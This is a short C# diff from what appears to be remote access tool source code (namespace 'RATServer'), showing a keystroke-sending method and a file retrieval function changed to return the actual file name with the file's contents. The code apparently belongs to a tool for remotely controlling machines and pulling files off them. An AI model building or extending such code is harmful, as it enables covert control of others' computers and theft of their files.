@@ -61,12 +61,12 @@ namespace RATServer
         {
             SendKeys.SendWait(Keys);
         }
-        public static Response Retrieve(string Path)
+        public static Response Retrieve(string Dir)
         {
             Response r = new Response();
             r.Type = "Data";
-            r.Msg = "FileName.txt";
-            r.Data = File.ReadAllBytes(Path);
+            r.Msg = Path.GetFileName(Dir);
+            r.Data = File.ReadAllBytes(Dir);
             return r;
         }
         public static string Services()
